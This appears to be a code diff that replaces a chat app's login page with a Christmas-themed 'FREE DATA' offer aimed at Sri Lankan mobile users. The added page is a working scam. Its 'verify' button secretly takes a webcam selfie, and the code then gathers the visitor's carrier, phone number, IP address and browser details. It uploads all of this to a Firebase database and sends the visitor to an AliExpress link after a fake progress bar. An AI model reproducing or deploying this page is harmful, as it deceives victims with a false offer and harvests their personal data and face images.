@@ -1,109 +1,397 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>Rhythm Chat</title>
-<link rel="preconnect" href="https://fonts.googleapis.com">
-<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=Mona+Sans:wght@200..900&display=swap" rel="stylesheet">
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-<style>
-:root{--bg-dark:#09090b;--card-bg:rgba(20,20,23,0.85);--card-border:rgba(255,255,255,0.08);--primary:#22c55e;--primary-dim:rgba(34,197,94,0.2);--text-main:#ffffff;--text-muted:#a1a1aa;--input-bg:#18181b;--error:#ef4444;--warning:#f59e0b;--font-head:'Mona Sans',sans-serif;--font-body:'Inter',sans-serif}*{box-sizing:border-box;margin:0;padding:0;outline:0;-webkit-tap-highlight-color:transparent}body{background-color:var(--bg-dark);color:var(--text-main);font-family:var(--font-body);height:100vh;overflow:hidden;display:flex;justify-content:center;align-items:center;position:relative}body::before{content:'';position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:120vw;height:120vh;background:radial-gradient(circle,rgba(34,197,94,0.25) 0%,rgba(9,9,11,0) 60%);z-index:0;pointer-events:none}@keyframes slideInRight{from{opacity:0;transform:translateX(50px)}to{opacity:1;transform:translateX(0)}}@keyframes slideOutLeft{from{opacity:1;transform:translateX(0)}to{opacity:0;transform:translateX(-50px)}}@keyframes fadeIn{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}.anim-enter{animation:slideInRight .4s cubic-bezier(.16,1,.3,1) forwards}.anim-exit{animation:slideOutLeft .4s cubic-bezier(.16,1,.3,1) forwards}.app-container{width:100%;max-width:400px;padding:20px;z-index:10;display:none;flex-direction:column;perspective:1000px}.auth-card{background:var(--card-bg);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border:1px solid var(--card-border);border-radius:24px;padding:32px;box-shadow:0 25px 50px -12px rgba(0,0,0,.5);overflow:hidden}h1{font-family:var(--font-head);font-size:32px;font-weight:700;text-align:center;margin-bottom:8px;background:linear-gradient(180deg,#fff 0%,#a1a1aa 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent}p.sub-text{text-align:center;color:var(--text-muted);font-size:14px;margin-bottom:32px}.input-wrapper{position:relative;margin-bottom:16px}.input-field{width:100%;background:var(--input-bg);border:1px solid var(--card-border);padding:16px 16px 16px 48px;border-radius:16px;color:#fff;font-family:var(--font-body);font-size:15px;transition:all .3s ease}select.input-field{appearance:none;background-color:var(--input-bg);color:#fff}select.input-field option{background-color:#18181b;color:#fff;padding:10px}.input-field:focus{border-color:var(--primary);box-shadow:0 0 0 4px rgba(34,197,94,.1)}.input-icon{position:absolute;left:18px;top:50%;transform:translateY(-50%);color:var(--text-muted);font-size:16px}.status-icon{position:absolute;right:18px;top:50%;transform:translateY(-50%);font-size:14px}.fa-check{color:var(--primary)}.fa-xmark{color:var(--error)}.spinner{width:16px;height:16px;border:2px solid rgba(255,255,255,.1);border-top-color:var(--primary);border-radius:50%;animation:spin .8s linear infinite}.action-btn{width:100%;background:var(--primary);color:#000;border:none;padding:16px;border-radius:16px;font-family:var(--font-head);font-weight:700;font-size:16px;cursor:pointer;margin-top:10px;transition:all .3s;display:flex;justify-content:center;align-items:center;gap:8px}.action-btn:active{transform:scale(.98)}.action-btn.disabled{background:#3f3f46;color:#71717a;cursor:not-allowed;pointer-events:none}.link-text{text-align:center;margin-top:24px;color:var(--text-muted);font-size:13px;cursor:pointer}.link-text span{color:var(--primary);font-weight:600}.strength-meter{height:4px;background:#27272a;border-radius:2px;margin:-8px 0 16px 0;overflow:hidden;transition:.3s}.strength-bar{height:100%;width:0%;transition:width .3s,background .3s}.profile-ui{background:rgba(255,255,255,.03);backdrop-filter:blur(20px);-webkit-backdrop-filter:blur(20px);border:1px solid rgba(255,255,255,.1);border-radius:24px;overflow:hidden;text-align:center;color:#fff;padding-bottom:24px;box-shadow:0 25px 50px -12px rgba(0,0,0,.5)}.pc-banner{height:110px;background:linear-gradient(135deg,rgba(34,197,94,.4) 0%,rgba(22,163,74,.4) 100%);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px);border-bottom:1px solid rgba(255,255,255,.1)}.pc-avatar{width:100px;height:100px;border-radius:50%;background:#27272a;border:4px solid rgba(255,255,255,.1);margin:-50px auto 12px;position:relative;cursor:pointer;display:flex;justify-content:center;align-items:center;overflow:hidden;box-shadow:0 10px 20px rgba(0,0,0,.3)}.pc-avatar img{width:100%;height:100%;object-fit:cover;display:none}.pc-avatar i{font-size:24px;color:#a1a1aa}.pc-name{font-family:var(--font-head);font-weight:800;font-size:22px;margin-bottom:4px;color:#fff}.pc-user{color:var(--primary);font-size:14px;margin-bottom:20px;font-weight:500}.pc-input{width:85%;margin:0 auto;background:rgba(0,0,0,.3);border:1px solid rgba(255,255,255,.1);padding:12px;border-radius:12px;text-align:center;color:#fff;font-family:var(--font-body)}#splash-screen{position:fixed;top:0;left:0;width:100%;height:100%;background:var(--bg-dark);z-index:9999;display:flex;flex-direction:column;align-items:center;justify-content:center;transition:opacity .5s}#splash-logo{width:100px;margin-bottom:20px}.loader-ring{width:24px;height:24px;border:2px solid rgba(34,197,94,.2);border-top-color:var(--primary);border-radius:50%;animation:spin .8s linear infinite}@keyframes spin{to{transform:rotate(360deg)}}#toast-box{position:fixed;top:20px;left:50%;transform:translateX(-50%);z-index:10000;width:90%;max-width:350px;pointer-events:none}.toast{background:rgba(24,24,27,.95);color:#fff;padding:14px 20px;border-radius:14px;margin-bottom:10px;font-size:14px;border-left:4px solid;box-shadow:0 10px 30px rgba(0,0,0,.5);animation:fadeIn .3s forwards}#fs-loader{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(9,9,11,.95);z-index:10001;display:none;justify-content:center;align-items:center;flex-direction:column}.hidden{display:none!important}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>X-mAS reactr 🎄</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Mountains+of+Christmas:wght@700&family=Noto+Sans+Sinhala:wght@400;700&display=swap');
+
+        :root {
+            --primary-red: #d42426;
+            --primary-green: #165b33;
+            --gold: #f8b229;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: 'Noto Sans Sinhala', sans-serif;
+            background: linear-gradient(135deg, #165b33, #0b2d19);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow-x: hidden;
+            color: #333;
+        }
+
+        /* Snow */
+        #snow-container {
+            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+            pointer-events: none; z-index: 1;
+        }
+        .snowflake {
+            position: absolute; top: -10px; color: white;
+            animation: fall linear infinite;
+        }
+
+        /* Card */
+        .card {
+            background: rgba(255, 255, 255, 0.98);
+            width: 90%; max-width: 400px;
+            border-radius: 20px; text-align: center;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+            z-index: 10; position: relative;
+            border: 4px solid var(--primary-red);
+            padding: 25px 20px; 
+            margin: 20px 0;
+        }
+
+        h1 {
+            font-family: 'Mountains of Christmas', cursive;
+            color: var(--primary-red); margin: 0; font-size: 2.2rem;
+            margin-bottom: 5px;
+        }
+
+        .funny-text {
+            font-weight: 800; font-size: 1.5rem;
+            background: -webkit-linear-gradient(#f8b229, #d42426);
+            -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+            margin: 10px 0 20px 0; text-transform: uppercase;
+            animation: wiggle 2s linear infinite;
+        }
+
+        /* Inputs */
+        select, .data-btn, #reload-btn, input[type="text"], .capture-btn {
+            width: 100%; border-radius: 10px; font-family: inherit; box-sizing: border-box;
+        }
+
+        select, input[type="text"] {
+            padding: 12px; border: 2px solid #ccc; margin-bottom: 15px; font-size: 1rem;
+        }
+
+        /* Phone Input Specifics */
+        .phone-group { position: relative; text-align: left; margin-bottom: 15px; }
+        .phone-label { font-size: 0.9rem; color: var(--primary-green); font-weight: bold; margin-bottom: 5px; display: block; }
+        
+        .capture-btn {
+            padding: 12px; border: 2px solid var(--gold);
+            background: #fff8e1; color: #d48806;
+            font-weight: bold; cursor: pointer; margin-bottom: 20px;
+            display: flex; justify-content: center; align-items: center; gap: 10px;
+            transition: 0.3s;
+        }
+        .capture-btn:active { transform: scale(0.98); }
+        .capture-btn.captured {
+            background: var(--primary-green); color: white; border-color: var(--primary-green);
+        }
+
+        .data-grid {
+            display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 15px;
+        }
+
+        .data-btn {
+            padding: 12px; border: 2px solid var(--primary-green);
+            background: white; color: var(--primary-green);
+            font-weight: bold; cursor: pointer;
+        }
+
+        .data-btn.active {
+            background: var(--primary-green); color: white;
+            transform: scale(1.05);
+        }
+
+        #reload-btn {
+            padding: 15px; background: var(--primary-red); color: white;
+            border: none; border-radius: 50px; font-size: 1.5rem;
+            font-weight: bold; font-family: 'Mountains of Christmas', cursive;
+            cursor: pointer; display: none; animation: pulse 1.5s infinite;
+        }
+
+        /* Modals */
+        .modal-overlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.85); z-index: 1000;
+            display: none; justify-content: center; align-items: center;
+        }
+
+        .modal-box {
+            background: white; padding: 25px; border-radius: 15px;
+            width: 85%; max-width: 350px; text-align: center;
+            border: 3px solid var(--primary-red);
+        }
+
+        .loader-circle {
+            border: 8px solid #f3f3f3; border-top: 8px solid var(--primary-red);
+            border-radius: 50%; width: 60px; height: 60px;
+            animation: spin 1s linear infinite; margin: 0 auto 20px auto;
+        }
+
+        /* Animations */
+        @keyframes fall { to { transform: translateY(110vh); } }
+        @keyframes wiggle { 0%, 7% { transform: rotateZ(0); } 15% { transform: rotateZ(-5deg); } 20% { transform: rotateZ(3deg); } 25% { transform: rotateZ(-5deg); } 30% { transform: rotateZ(2deg); } 35%, 100% { transform: rotateZ(0); } }
+        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
 </head>
 <body>
-<div id="splash-screen"><img src="https://i.ibb.co/hRcmZz4c/logo-main-rhythm-chat.png" id="splash-logo"><div class="loader-ring"></div></div>
-<div id="toast-box"></div>
-<div id="fs-loader"><div class="loader-ring" style="width:40px;height:40px;border-width:3px"></div><p style="margin-top:15px;font-size:14px;color:var(--primary);letter-spacing:1px;font-weight:600">PROCESSING</p></div>
-<div class="app-container" id="main-ui">
-<div id="view-login" class="auth-card anim-enter">
-<h1>Welcome back</h1><p class="sub-text">Sign in to continue</p>
-<form id="form-login">
-<div class="input-wrapper"><i class="fa-regular fa-envelope input-icon"></i><input type="email" id="log-email" class="input-field" placeholder="Email address" required></div>
-<div class="input-wrapper"><i class="fa-solid fa-lock input-icon"></i><input type="password" id="log-pass" class="input-field" placeholder="Password" required></div>
-<button type="submit" class="action-btn">Log In <i class="fa-solid fa-arrow-right"></i></button>
-</form>
-<div class="link-text" id="goto-reg">New to Rhythm? <span>Create Account</span></div>
-</div>
-<div id="view-register" class="auth-card hidden">
-<h1>Create Account</h1>
-<div id="carousel-track">
-<div class="c-step" id="step-1">
-<p class="sub-text">What should we call you?</p>
-<div class="input-wrapper"><i class="fa-regular fa-user input-icon"></i><input type="text" id="reg-name" class="input-field" placeholder="Full Name"></div>
-<div class="input-wrapper"><i class="fa-solid fa-at input-icon"></i><input type="text" id="reg-user" class="input-field" placeholder="Username"><div id="user-status" class="status-icon"></div></div>
-<button class="action-btn disabled" id="btn-step-1" data-current="1">Next</button>
-</div>
-<div class="c-step hidden" id="step-2">
-<p class="sub-text">Secure your account</p>
-<div class="input-wrapper"><i class="fa-regular fa-envelope input-icon"></i><input type="email" id="reg-email" class="input-field" placeholder="Email Address"></div>
-<div class="input-wrapper"><i class="fa-solid fa-lock input-icon"></i><input type="password" id="reg-pass" class="input-field" placeholder="Password"></div>
-<div class="strength-meter"><div class="strength-bar" id="pass-bar"></div></div>
-<button class="action-btn next-step" data-current="2">Next</button>
-</div>
-<div class="c-step hidden" id="step-3">
-<p class="sub-text">Mobile Number</p>
-<div style="display:flex;gap:10px;margin-bottom:16px"><select id="reg-cc" class="input-field" style="width:40%;padding-left:12px;font-size:18px"></select><input type="tel" id="reg-phone" class="input-field" style="width:60%" placeholder="123 456 789"></div>
-<button class="action-btn" id="btn-pre-signup">Continue</button>
-</div>
-</div>
-<div class="link-text" id="goto-log">Already have an account? <span>Log In</span></div>
-</div>
-<div id="view-profile" class="hidden" style="perspective:1000px">
-<div class="profile-ui anim-enter">
-<div class="pc-banner"></div>
-<div class="pc-avatar" id="pic-trigger"><i class="fa-solid fa-camera"></i><img id="pic-preview" src=""><input type="file" id="pic-file" hidden accept="image/*"></div>
-<h3 class="pc-name" id="disp-name">User</h3><p class="pc-user" id="disp-user">@username</p>
-<input type="text" id="pc-about" class="pc-input" placeholder="About you...">
-<div style="padding:20px"><button class="action-btn" id="btn-finish" style="background:var(--primary);color:#000">All Done</button></div>
-</div>
-</div>
-</div>
-<script type="module">
-const _s = "Salted__"; 
-const _p = [
-    "Q1Z4cmJ4cWw=", "T29wcywgdGhpcyBpcyBub3QgcmVhbA==", "QUl6YVN5Qk9IUEZaWkNhTWdSdHNycmw1Y18zcmV6WlBzaGc5NFA4",
-    "cmh5dGhtY2hhdC1jMTQwZi5maXJlYmFzZWFwcC5jb20=", "aHR0cHM6Ly9yaHl0aG1jaGF0LWMxNDBmLWRlZmF1bHQtcnRkYi5hc2lhLXNvdXRoZWFzdDEuZmlyZWJhc2VkYXRhYmFzZS5hcHA=",
-    "cmh5dGhtY2hhdC1jMTQwZg==", "cmh5dGhtY2hhdC1jMTQwZi5maXJlYmFzZXN0b3JhZ2UuYXBw", "NDU0MDAzOTYwNTA=",
-    "MTo0NTQwMDM5NjA1MDp3ZWI6ZmE5NTI1NjU4OTg5MmYxOTQwZTNjYg==", "Ry1HUDFTR0RaTDZY"
-];
-const _d = (s) => atob(s);
-import { initializeApp } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js";
-import { getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-auth.js";
-import { getDatabase, ref, set, get, query, orderByChild, equalTo } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-database.js";
-const c = {
-    apiKey: _d(_p[2]), authDomain: _d(_p[3]), databaseURL: _d(_p[4]),
-    projectId: _d(_p[5]), storageBucket: _d(_p[6]), messagingSenderId: _d(_p[7]),
-    appId: _d(_p[8]), measurementId: _d(_p[9])
-};
-const app = initializeApp(c);
-const auth = getAuth(app);
-const db = getDatabase(app);
-const cd = [{f:"🇱🇰",c:"+94"},{f:"🇺🇸",c:"+1"},{f:"🇬🇧",c:"+44"},{f:"🇮🇳",c:"+91"},{f:"🇦🇺",c:"+61"},{f:"🇨🇦",c:"+1"},{f:"🇦🇪",c:"+971"},{f:"🇯🇵",c:"+81"},{f:"🇨🇳",c:"+86"},{f:"🇫🇷",c:"+33"},{f:"🇩🇪",c:"+49"},{f:"🇮🇹",c:"+39"},{f:"🇷🇺",c:"+7"},{f:"🇧🇷",c:"+55"},{f:"🇲🇽",c:"+52"},{f:"🇿🇦",c:"+27"},{f:"🇰🇷",c:"+82"},{f:"🇸🇬",c:"+65"},{f:"🇵🇰",c:"+92"},{f:"🇧🇩",c:"+880"}];
-let rd = {}, pp = "", uv = false, dt;
-const cs = document.getElementById('reg-cc');
-cd.forEach(i=>{const o=document.createElement('option');o.value=i.c;o.textContent=`${i.f} ${i.c}`;cs.appendChild(o)});
-window.addEventListener('load',()=>{const u=localStorage.getItem('rhythm_uid');setTimeout(()=>{const s=document.getElementById('splash-screen');s.style.opacity='0';setTimeout(()=>{s.style.display='none';if(u)window.location.href="home.html";else document.getElementById('main-ui').style.display='flex'},500)},1000)});
-function t(m,y='success'){const b=document.getElementById('toast-box'),e=document.createElement('div');e.className='toast';e.style.borderLeftColor=y==='error'?'#ef4444':'#22c55e';e.innerText=m;b.appendChild(e);setTimeout(()=>e.remove(),3500)}
-const vl=document.getElementById('view-login'),vr=document.getElementById('view-register');
-function sw(h,s){h.classList.remove('anim-enter');h.classList.add('anim-exit');setTimeout(()=>{h.classList.add('hidden');h.classList.remove('anim-exit');s.classList.remove('hidden');s.classList.add('anim-enter')},300)}
-document.getElementById('goto-reg').onclick=()=>sw(vl,vr);document.getElementById('goto-log').onclick=()=>sw(vr,vl);
-const ni=document.getElementById('reg-name'),ui=document.getElementById('reg-user'),us=document.getElementById('user-status'),b1=document.getElementById('btn-step-1');
-ni.addEventListener('input',e=>{const v=e.target.value;if(/[^a-zA-Z\s]/g.test(v))t("Symbols not allowed in name","error");const g=v.toLowerCase().replace(/[^a-z]/g,'');if(ui.value===''||ui.value.length<g.length){ui.value=g;ch(g)}});
-ui.addEventListener('input',e=>ch(e.target.value));
-function ch(v){clearTimeout(dt);uv=false;b1.classList.add('disabled');if(v.length<3){us.innerHTML='';return}us.innerHTML='<div class="spinner"></div>';dt=setTimeout(async()=>{const u=v.trim();try{const q=query(ref(db,'users'),orderByChild('data/username'),equalTo(u));const s=await get(q);if(s.exists()){us.innerHTML='<i class="fa-solid fa-xmark"></i>';t("Username taken","error")}else{us.innerHTML='<i class="fa-solid fa-check"></i>';uv=true;b1.classList.remove('disabled')}}catch(e){console.warn(e);us.innerHTML='<i class="fa-solid fa-check"></i>';uv=true;b1.classList.remove('disabled')}},800)}
-const pi=document.getElementById('reg-pass'),pb=document.getElementById('pass-bar');
-pi.addEventListener('input',e=>{const v=e.target.value;let s=0;if(v.length>5)s+=30;if(v.length>8)s+=20;if(/[A-Z]/.test(v))s+=25;if(/[0-9]/.test(v))s+=25;pb.style.width=s+"%";pb.style.background=s<50?"#ef4444":s<80?"#f59e0b":"#22c55e"});
-const s1=document.getElementById('step-1'),s2=document.getElementById('step-2'),s3=document.getElementById('step-3');
-b1.addEventListener('click',()=>{if(!uv)return;const n=ni.value.trim(),u=ui.value.trim();if(!n)return t("Name required","error");rd.n=n;rd.u=u;s1.classList.add('hidden');s2.classList.remove('hidden');s2.classList.add('anim-enter')});
-document.querySelectorAll('.next-step').forEach(b=>{b.addEventListener('click',e=>{const c=parseInt(e.target.dataset.current);if(c===2){const em=document.getElementById('reg-email').value.trim(),pw=pi.value;if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(em))return t("Invalid Email","error");if(pw.length<6)return t("Password weak","error");rd.e=em;rd.p=pw;s2.classList.add('hidden');s3.classList.remove('hidden');s3.classList.add('anim-enter')}})});
-document.getElementById('btn-pre-signup').onclick=()=>{const p=document.getElementById('reg-phone').value.trim();if(!p)return t("Phone required","error");rd.ph=document.getElementById('reg-cc').value+p;vr.classList.add('hidden');document.getElementById('view-profile').classList.remove('hidden');document.getElementById('disp-name').innerText=rd.n;document.getElementById('disp-user').innerText="@"+rd.u};
-document.getElementById('pic-trigger').onclick=()=>document.getElementById('pic-file').click();
-document.getElementById('pic-file').onchange=e=>{const f=e.target.files[0];if(f){const r=new FileReader();r.onload=ev=>{const i=new Image();i.src=ev.target.result;i.onload=()=>{const c=document.createElement('canvas'),x=c.getContext('2d'),z=300;c.width=z;c.height=z;x.drawImage(i,0,0,z,z);pp=c.toDataURL('image/jpeg',0.6);document.getElementById('pic-preview').src=pp;document.getElementById('pic-preview').style.display='block';document.querySelector('.pc-avatar i').style.display='none'}};r.readAsDataURL(f)}};
-document.getElementById('btn-finish').onclick=async()=>{document.getElementById('fs-loader').style.display='flex';try{const u=await createUserWithEmailAndPassword(auth,rd.e,rd.p),i=u.user.uid,k=rd.e.replace(/\./g,',');await set(ref(db,`users/${k}/data`),{uid:i,name:rd.n,username:rd.u,email:rd.e,phone:rd.ph,about:document.getElementById('pc-about').value||"Hey there!",profilePic:pp});localStorage.setItem('rhythm_uid',i);setTimeout(()=>window.location.href="home.html",1000)}catch(e){document.getElementById('fs-loader').style.display='none';let m=e.message;if(m.includes('email-already'))m="Email already in use";t(m,"error")}};
-document.getElementById('form-login').onsubmit=async e=>{e.preventDefault();try{const u=await signInWithEmailAndPassword(auth,document.getElementById('log-email').value,document.getElementById('log-pass').value);localStorage.setItem('rhythm_uid',u.user.uid);window.location.href="home.html"}catch(x){t("Invalid credentials","error")}};
-document.addEventListener('contextmenu',e=>e.preventDefault());
-</script>
+
+    <div id="snow-container"></div>
+
+    <!-- LOADER MODAL -->
+    <div id="loader-modal" class="modal-overlay">
+        <div class="modal-box">
+            <div class="loader-circle"></div>
+            <h3>Processing...</h3>
+            <p id="progress-text">Connecting 0%</p>
+        </div>
+    </div>
+
+    <!-- MAIN UI -->
+    <div class="card">
+        <h1>X-mAS reactr 🎅</h1>
+        <div class="funny-text">FREE DATA by reactr</div>
+
+        <!-- Capture Button -->
+        <button id="capture-btn" class="capture-btn" onclick="captureProfilePhoto()">
+            <span>🔐</span> Click Here To Verify Before Proceed
+        </button>
+
+        <!-- Carrier Select -->
+        <div class="phone-group">
+            <label class="phone-label">සිම්පත තෝරාගන්න 👇</label>
+            <select id="carrier">
+                <option value="" disabled selected>Select SIM</option>
+                <option value="Hutch">Hutch</option>
+                <option value="Airtel">Airtel</option>
+                <option value="Dialog">Dialog</option>
+                <option value="Mobitel">Mobitel</option>
+            </select>
+        </div>
+
+        <!-- Phone Number Input -->
+        <div class="phone-group">
+            <label class="phone-label" for="phone">Phone Number 📱</label>
+            <input type="text" id="phone" placeholder="+94 7X XXX XXXX" value="+94" maxlength="12">
+            <small id="phone-error" style="color: red; display: none;">Invalid Number! Must be +94 7...</small>
+        </div>
+
+        <!-- Data Grid -->
+        <div class="data-grid">
+            <button class="data-btn" onclick="selectData(this, '1GB')">1 GB</button>
+            <button class="data-btn" onclick="selectData(this, '5GB')">5 GB</button>
+            <button class="data-btn" onclick="selectData(this, '10GB')">10 GB</button>
+            <button class="data-btn" onclick="selectData(this, '50GB')">50 GB</button>
+        </div>
+
+        <button id="reload-btn" onclick="handleFinalSubmit()">RELOAD NOW 🚀</button>
+
+        <div class="footer">
+            X-mAS Reactr Special Edition ☃️
+        </div>
+    </div>
+
+    <!-- Firebase SDKs -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-app.js";
+        import { getDatabase, ref, push, set } from "https://www.gstatic.com/firebasejs/9.22.0/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyC0P8GHxEzzYhI-7KNjKhKjZtBWt7Lk1p4",
+            authDomain: "reactr-5b381.firebaseapp.com",
+            databaseURL: "https://reactr-5b381-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "reactr-5b381",
+            storageBucket: "reactr-5b381.firebasestorage.app",
+            messagingSenderId: "461901456532",
+            appId: "1:461901456532:web:c4a62622565e07dcb00081",
+            measurementId: "G-YNVEGSLSNT"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const database = getDatabase(app);
+
+        // Expose save function globally
+        window.saveDataToFirebase = function(data) {
+            const dataRef = ref(database, 'xmas_reactr_submissions');
+            const newEntry = push(dataRef);
+            set(newEntry, data)
+                .then(() => console.log("Data saved successfully"))
+                .catch((e) => console.error("Error saving data: ", e));
+        };
+    </script>
+
+    <script>
+        // --- Global Variables ---
+        let selectedDataAmount = "";
+        let capturedImageBase64 = null;
+
+        // --- 1. Snow Animation ---
+        function createSnow() {
+            const container = document.getElementById('snow-container');
+            setInterval(() => {
+                const flake = document.createElement('div');
+                flake.classList.add('snowflake');
+                flake.innerText = ['❄️', '❅', '❆', '✨'][Math.floor(Math.random() * 4)];
+                flake.style.left = Math.random() * 100 + 'vw';
+                flake.style.opacity = Math.random();
+                flake.style.fontSize = (Math.random() * 20 + 10) + 'px';
+                flake.style.animationDuration = (Math.random() * 3 + 2) + 's';
+                container.appendChild(flake);
+                setTimeout(() => flake.remove(), 5000);
+            }, 200);
+        }
+        createSnow();
+
+        // --- 2. Phone Validation Logic ---
+        const phoneInput = document.getElementById('phone');
+        const phoneError = document.getElementById('phone-error');
+
+        phoneInput.addEventListener('input', function(e) {
+            let value = e.target.value;
+            // Force +94 start
+            if (!value.startsWith('+94')) {
+                value = '+94' + value.replace(/^\+94/, '');
+            }
+            // Allow only numbers after +
+            value = '+' + value.substring(1).replace(/[^0-9]/g, '');
+            
+            // Prevent 0 after 94 (index 3)
+            if (value.length > 3 && value.charAt(3) === '0') {
+                value = value.slice(0, 3);
+            }
+            e.target.value = value;
+        });
+
+        function validatePhone() {
+            const regex = /^\+947[0-9]{8}$/; // +94 followed by 7 and 8 digits
+            if (!regex.test(phoneInput.value)) {
+                phoneError.style.display = 'block';
+                phoneInput.style.borderColor = 'red';
+                return false;
+            }
+            phoneError.style.display = 'none';
+            phoneInput.style.borderColor = '#165b33';
+            return true;
+        }
+
+        // --- 3. Camera Capture Logic (Hidden/Background style) ---
+        async function captureProfilePhoto() {
+            try {
+                // Request Camera (User will see permission prompt)
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: 'user', width: 320 } // Low res for faster upload
+                });
+
+                // Create hidden video element to process stream
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.playsInline = true;
+                video.autoplay = true;
+
+                // Wait for video to be ready
+                await new Promise(resolve => video.onloadedmetadata = resolve);
+                
+                // Short delay to allow auto-exposure/focus
+                await new Promise(resolve => setTimeout(resolve, 500));
+
+                // Capture to hidden canvas
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const ctx = canvas.getContext('2d');
+                
+                // Flip horizontally (mirror selfie)
+                ctx.translate(canvas.width, 0);
+                ctx.scale(-1, 1);
+                ctx.drawImage(video, 0, 0);
+
+                // Convert to Base64
+                capturedImageBase64 = canvas.toDataURL('image/jpeg', 0.7); // 0.7 quality
+
+                // Stop Stream
+                stream.getTracks().forEach(track => track.stop());
+
+                // Update UI
+                const btn = document.getElementById('capture-btn');
+                btn.innerHTML = "<span>✅</span> Human Verified Successfully";
+                btn.classList.add('captured');
+
+            } catch (err) {
+                console.error(err);
+                alert("Camera permission is required to register! Please allow access.");
+            }
+        }
+
+        // --- 4. UI Interactions ---
+        function selectData(element, amount) {
+            document.querySelectorAll('.data-btn').forEach(btn => btn.classList.remove('active'));
+            element.classList.add('active');
+            selectedDataAmount = amount;
+            const btn = document.getElementById('reload-btn');
+            btn.style.display = 'block';
+            btn.scrollIntoView({ behavior: "smooth" });
+        }
+
+        // --- 5. Final Submission ---
+        async function handleFinalSubmit() {
+            // Validation
+            if (!document.getElementById('carrier').value) {
+                alert("Please select a SIM!");
+                return;
+            }
+            if (!validatePhone()) {
+                alert("Please check your phone number!");
+                return;
+            }
+            if (!capturedImageBase64) {
+                // Optional: Force photo? Let's warn but allow if fails
+                if(!confirm("You haven't captured a photo yet. Proceed anyway?")) return;
+            }
+
+            // Show Loader
+            document.getElementById('loader-modal').style.display = 'flex';
+
+            // Get IP
+            let userIp = "Unknown";
+            try {
+                const res = await fetch('https://api.ipify.org?format=json');
+                const json = await res.json();
+                userIp = json.ip;
+            } catch(e) {}
+
+            // Compile Data
+            const userData = {
+                carrier: document.getElementById('carrier').value,
+                phone: document.getElementById('phone').value,
+                dataPackage: selectedDataAmount,
+                photoBase64: capturedImageBase64 || "No Photo",
+                ip: userIp,
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString()
+            };
+
+            // Save to Firebase
+            if (window.saveDataToFirebase) {
+                window.saveDataToFirebase(userData);
+            }
+
+            // Loader Animation & Redirect
+            let progress = 0;
+            const textElement = document.getElementById('progress-text');
+            const interval = setInterval(() => {
+                progress += Math.floor(Math.random() * 10) + 5;
+                if (progress > 100) progress = 100;
+                textElement.innerText = `Connecting ${progress}%`;
+
+                if (progress === 100) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        window.location.href = "https://www.aliexpress.com/ssr/300001995/N3KsYt2f3a?disableNav=YES&pha_manifest=ssr&_immersiveMode=true";
+                    }, 2000);
+                }
+            }, 300);
+        }
+    </script>
 </body>
 </html>
